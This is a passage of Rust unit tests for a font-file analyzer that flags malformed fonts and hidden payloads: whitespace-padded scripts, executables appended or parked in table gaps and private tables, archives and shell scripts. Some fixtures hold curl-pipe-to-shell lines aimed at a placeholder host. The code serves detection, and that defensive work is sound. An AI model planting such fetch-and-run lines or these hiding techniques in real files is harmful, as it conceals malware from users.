        out.extend_from_slice(b"glyf");
        out.extend_from_slice(&[0; 4]);
        out.extend_from_slice(&(dir_end as u32).to_be_bytes());
        out.extend_from_slice(&0x00FF_FFFFu32.to_be_bytes()); // absurd length
        let (v, _) = run(&out);
        assert!(features(&v).contains(&"table_out_of_bounds".to_string()));
        assert_eq!(
            v.get("font.valid").and_then(JsonValue::as_bool),
            Some(false)
        );
    }

    #[test]
    fn woff_header_size_lie_is_reported() {
        let mut out = Vec::new();
        out.extend_from_slice(b"wOFF");
        out.extend_from_slice(&[0x00, 0x01, 0x00, 0x00]); // flavor
        out.extend_from_slice(&64u32.to_be_bytes()); // declared length (short)
        out.extend_from_slice(&0u16.to_be_bytes()); // numTables
        out.extend_from_slice(&[0; 30]);
        out.resize(300, 0x00);
        let (v, m) = run(&out);
        assert_eq!(format_of(&v), "woff");
        assert!(features(&v).contains(&"size_mismatch".to_string()));
        assert!(features(&v).contains(&"trailing_data".to_string()));
        assert!(m.get("font.trailing_bytes").unwrap() > 200.0);
    }

    #[test]
    fn woff2_records_declared_size() {
        let mut out = Vec::new();
        out.extend_from_slice(b"wOF2");
        out.extend_from_slice(&[0x00, 0x01, 0x00, 0x00]);
        out.extend_from_slice(&200u32.to_be_bytes()); // declared length
        out.extend_from_slice(&3u16.to_be_bytes()); // numTables
        out.extend_from_slice(&[0; 34]);
        out.resize(200, 0x00);
        let (v, m) = run(&out);
        assert_eq!(format_of(&v), "woff2");
        assert_eq!(m.get("font.table_count"), Some(3.0));
        assert_eq!(v.get("font.valid").and_then(JsonValue::as_bool), Some(true));
    }

    #[test]
    fn eot_detected_by_magic_field() {
        let mut out = vec![0u8; 64];
        out[0..4].copy_from_slice(&64u32.to_le_bytes()); // EOTSize == file size
        out[4..8].copy_from_slice(&16u32.to_le_bytes()); // FontDataSize
        out[EOT_MAGIC_OFFSET] = 0x4C;
        out[EOT_MAGIC_OFFSET + 1] = 0x50;
        let (v, _) = run(&out);
        assert_eq!(format_of(&v), "eot");
        assert_eq!(v.get("font.valid").and_then(JsonValue::as_bool), Some(true));
    }

    /// The case this module exists for: a `.woff2` whose bytes are a
    /// whitespace-padded script. No signature, so the format is `none`, the
    /// file is invalid, and the text/padding metrics carry the evidence.
    #[test]
    fn script_wearing_a_font_name_is_invalid_and_texty() {
        let mut payload = " ".repeat(997);
        payload.push_str("function a(){const t=['deadbeef','cafebabe'];return t}a();");
        let (v, m) = run(payload.as_bytes());
        assert_eq!(format_of(&v), "none");
        assert_eq!(
            v.get("font.valid").and_then(JsonValue::as_bool),
            Some(false)
        );
        assert!(features(&v).contains(&"text_content".to_string()));
        assert!(m.get("font.printable_ratio").unwrap() > 0.99);
        assert_eq!(m.get("font.leading_whitespace_bytes"), Some(997.0));
        let problems = v.get("font.problems").and_then(|x| x.as_array()).unwrap();
        assert_eq!(problems[0].as_str(), Some("no font signature"));
    }

    #[test]
    fn pe_wearing_a_font_name_is_invalid_but_not_texty() {
        let mut payload = b"MZ\x90\x00\x03\x00\x00\x00".to_vec();
        payload.extend_from_slice(&[0u8; 512]);
        let (v, _) = run(&payload);
        assert_eq!(format_of(&v), "none");
        assert_eq!(
            v.get("font.valid").and_then(JsonValue::as_bool),
            Some(false)
        );
        assert!(!features(&v).contains(&"text_content".to_string()));
    }

    #[test]
    fn empty_input_does_not_panic() {
        let (v, m) = run(&[]);
        assert_eq!(format_of(&v), "none");
        assert_eq!(m.get("font.printable_ratio"), Some(0.0));
    }

    #[test]
    fn truncated_sfnt_header_does_not_panic() {
        let (v, _) = run(&[0x00, 0x01, 0x00, 0x00, 0x00]);
        assert!(features(&v).contains(&"truncated".to_string()));
    }

    #[test]
    fn absurd_table_count_is_rejected_without_allocating() {
        let mut out = Vec::new();
        out.extend_from_slice(&[0x00, 0x01, 0x00, 0x00]);
        out.extend_from_slice(&u16::MAX.to_be_bytes());
        out.extend_from_slice(&[0; 6]);
        let (v, _) = run(&out);
        assert_eq!(
            v.get("font.valid").and_then(JsonValue::as_bool),
            Some(false)
        );
    }

    #[test]
    fn collection_walks_members() {
        let member = build_sfnt_at(16, [0x00, 0x01, 0x00, 0x00], &[(b"head", &[0u8; 16])]);
        let mut out = Vec::new();
        out.extend_from_slice(b"ttcf");
        out.extend_from_slice(&[0x00, 0x01, 0x00, 0x00]);
        out.extend_from_slice(&1u32.to_be_bytes()); // numFonts
        out.extend_from_slice(&16u32.to_be_bytes()); // offset of member
        out.extend_from_slice(&member);
        let (v, _) = run(&out);
        assert_eq!(format_of(&v), "truetype_collection");
        assert_eq!(v.get("font.valid").and_then(JsonValue::as_bool), Some(true));
        let tables = v.get("font.tables").and_then(|x| x.as_array()).unwrap();
        assert_eq!(tables[0].as_str(), Some("head"));
    }

    /// Collection members deliberately share table data. Coverage is computed
    /// over the union, so a shared table is not reported as an unaccounted-for
    /// gap — the regression that marked every shipped macOS `.ttc` invalid.
    #[test]
    fn collection_members_may_share_tables() {
        let member = build_sfnt_at(20, [0x00, 0x01, 0x00, 0x00], &[(b"head", &[0u8; 32])]);
        let mut out = Vec::new();
        out.extend_from_slice(b"ttcf");
        out.extend_from_slice(&[0x00, 0x01, 0x00, 0x00]);
        out.extend_from_slice(&2u32.to_be_bytes()); // two members...
        out.extend_from_slice(&20u32.to_be_bytes()); // ...both pointing at the
        out.extend_from_slice(&20u32.to_be_bytes()); //    same directory
        out.extend_from_slice(&member);
        let (v, m) = run(&out);
        assert_eq!(v.get("font.valid").and_then(JsonValue::as_bool), Some(true));
        assert_eq!(m.get("font.gap_bytes"), Some(0.0));
        assert_eq!(m.get("font.table_count"), Some(1.0));
    }

    #[test]
    fn dsig_and_fvar_set_feature_flags() {
        let font = build_sfnt(
            [0x00, 0x01, 0x00, 0x00],
            &[(b"DSIG", &[0u8; 8]), (b"fvar", &[0u8; 8])],
        );
        let (v, _) = run(&font);
        let f = features(&v);
        assert!(f.contains(&"signed".to_string()));
        assert!(f.contains(&"variable".to_string()));
    }

    fn stowaway(v: &Values) -> Vec<String> {
        v.get("font.stowaway")
            .and_then(|x| x.as_array())
            .map(|a| {
                a.iter()
                    .filter_map(|x| x.as_str().map(str::to_string))
                    .collect()
            })
            .unwrap_or_default()
    }

    /// A DOS header with a working `e_lfanew`. Two bytes of `MZ` are not
    /// enough — see `mz_without_pe_signature_is_not_an_executable`.
    fn fake_pe(body: usize) -> Vec<u8> {
        let mut out = vec![0u8; 0x40];
        out[0] = b'M';
        out[1] = b'Z';
        out[0x3c..0x40].copy_from_slice(&0x40u32.to_le_bytes());
        out.extend_from_slice(b"PE\0\0");
        out.extend(std::iter::repeat_n(0x41u8, body));
        out
    }

    #[test]
    fn appended_executable_is_named_in_stowaway() {
        let mut font = build_sfnt([0x00, 0x01, 0x00, 0x00], &[(b"head", &[0u8; 54])]);
        font.extend_from_slice(&fake_pe(2048));
        let (v, m) = run(&font);
        assert_eq!(stowaway(&v), vec!["pe"]);
        assert!(m.get("font.stowaway_bytes").unwrap() > 2000.0);
    }

    /// Payload parked in a gap between two tables: no table points at it, so
    /// the font renders and nothing reads the bytes.
    #[test]
    fn payload_in_an_interior_gap_is_classified() {
        let dir_end = 12 + 2 * SFNT_RECORD_LEN;
        let payload = fake_pe(512);
        let mut out = Vec::new();
        out.extend_from_slice(&[0x00, 0x01, 0x00, 0x00]);
        out.extend_from_slice(&2u16.to_be_bytes());
        out.extend_from_slice(&[0; 6]);
        let first_len = 16u32;
        let second_off = dir_end as u32 + first_len + payload.len() as u32;
        for (tag, off, len) in [
            (b"head", dir_end as u32, first_len),
            (b"cmap", second_off, 16u32),
        ] {
            out.extend_from_slice(tag);
            out.extend_from_slice(&[0; 4]);
            out.extend_from_slice(&off.to_be_bytes());
            out.extend_from_slice(&len.to_be_bytes());
        }
        out.resize(dir_end + first_len as usize, 0);
        out.extend_from_slice(&payload);
        out.resize((second_off + 16) as usize, 0);
        let (v, _) = run(&out);
        assert_eq!(stowaway(&v), vec!["pe"]);
    }

    #[test]
    fn archive_and_script_stowaways_are_named() {
        for (payload, want) in [
            (b"PK\x03\x04rest of a zip".as_slice(), "zip"),
            (b"\x1f\x8b\x08gzip stream here".as_slice(), "gzip"),
            (b"#!/bin/sh\ncurl x | sh\n".as_slice(), "shebang"),
        ] {
            let mut font = build_sfnt([0x00, 0x01, 0x00, 0x00], &[(b"head", &[0u8; 54])]);
            font.extend_from_slice(payload);
            font.extend_from_slice(&[0u8; 300]);
            let (v, _) = run(&font);
            assert!(stowaway(&v).contains(&want.to_string()), "{want}");
        }
    }

    /// An unregistered tag is where a payload hides inside the directory
    /// rather than outside it — the font stays structurally valid.
    #[test]
    fn payload_in_a_private_table_is_classified() {
        let pe = fake_pe(1024);
        let font = build_sfnt(
            [0x00, 0x01, 0x00, 0x00],
            &[(b"head", &[0u8; 54]), (b"PWNZ", &pe)],
        );
        let (v, _) = run(&font);
        assert_eq!(v.get("font.valid").and_then(JsonValue::as_bool), Some(true));
        assert_eq!(stowaway(&v), vec!["pe"]);
    }

    /// The `name` table legitimately holds readable strings, so text there is
    /// not a stowaway — but a shebang or an executable image still is.
    #[test]
    fn name_table_text_is_expected_but_executables_are_not() {
        let prose = b"Copyright 2026 Example Foundry. All rights reserved. Regular";
        let font = build_sfnt([0x00, 0x01, 0x00, 0x00], &[(b"name", prose)]);
        assert!(stowaway(&run(&font).0).is_empty());

        let script = b"#!/bin/sh\ncurl -fsSL http://x.invalid | sh\n";
        let font = build_sfnt([0x00, 0x01, 0x00, 0x00], &[(b"name", script)]);
        assert_eq!(stowaway(&run(&font).0), vec!["shebang"]);
    }

    /// `MZ` is two bytes and occurs constantly in glyph outlines. Without a
    /// resolvable `PE\0\0` it is not an executable, and treating it as one
    /// would fire on ordinary fonts.
    #[test]
    fn mz_without_pe_signature_is_not_an_executable() {
        let mut noise = vec![0u8; 2048];
        noise[100] = b'M';
        noise[101] = b'Z';
        noise[900] = b'M';
        noise[901] = b'Z';
        let mut font = build_sfnt([0x00, 0x01, 0x00, 0x00], &[(b"head", &[0u8; 54])]);
        font.extend_from_slice(&noise);
        assert!(!stowaway(&run(&font).0).contains(&"pe".to_string()));
    }

    /// Whitespace padding pushes real magic past every fixed-window content
    /// sniffer, so the file reaches the font analyzer instead. Searching the
    /// whole file is what recovers the answer.
    #[test]
    fn padded_executable_is_reported_as_content_kind() {
        let mut payload = b" ".repeat(900);
        payload.extend_from_slice(&fake_pe(4096));
        let (v, _) = run(&payload);
        assert_eq!(
            v.get("font.content_kind").and_then(|x| x.as_str()),
            Some("pe")
        );
    }

    #[test]
    fn opaque_high_entropy_content_is_distinguished_from_text() {
        // Deterministic pseudo-random bytes: high entropy, no signature.
        let mut blob = Vec::new();
        let mut x: u32 = 0x1234_5678;
        while blob.len() < 8192 {
            x = x.wrapping_mul(1_664_525).wrapping_add(1_013_904_223);
            blob.extend_from_slice(&x.to_le_bytes());
        }
        let (v, _) = run(&blob);
        assert_eq!(
            v.get("font.content_kind").and_then(|x| x.as_str()),
            Some("high_entropy")
        );
    }

    /// A `name` table is legitimately claimed content, so its size must not
    /// land in `font.stowaway_bytes` — counting it reported several kilobytes
    /// of "unaccounted-for" bytes on every ordinary font.
    #[test]
    fn name_table_bytes_are_not_counted_as_stowaway() {
        let prose = b"Copyright 2026 Example Foundry. Regular. Designed by nobody.";
        let font = build_sfnt(
            [0x00, 0x01, 0x00, 0x00],
            &[(b"head", &[0u8; 54]), (b"name", prose)],
        );
        let (_, m) = run(&font);
        assert_eq!(m.get("font.stowaway_bytes"), Some(0.0));
        assert_eq!(m.get("font.stowaway_entropy"), Some(0.0));
    }

    #[test]
    fn a_clean_font_reports_no_stowaway() {
        let font = build_sfnt(
            [0x00, 0x01, 0x00, 0x00],
            &[(b"head", &[0u8; 54]), (b"cmap", &[0u8; 32])],
        );
        let (v, m) = run(&font);
        assert!(stowaway(&v).is_empty());
        assert_eq!(m.get("font.stowaway_bytes"), Some(0.0));
        assert_eq!(m.get("font.stowaway_entropy"), Some(0.0));
    }

    #[test]
    fn non_printable_tag_is_escaped() {
        let font = build_sfnt(
            [0x00, 0x01, 0x00, 0x00],
            &[(&[0x01, 0x02, b'a', b'b'], &[0u8; 4])],
        );
        let (v, _) = run(&font);
        let tables = v.get("font.tables").and_then(|x| x.as_array()).unwrap();
        assert_eq!(tables[0].as_str(), Some("\\x01\\x02ab"));
    }
}
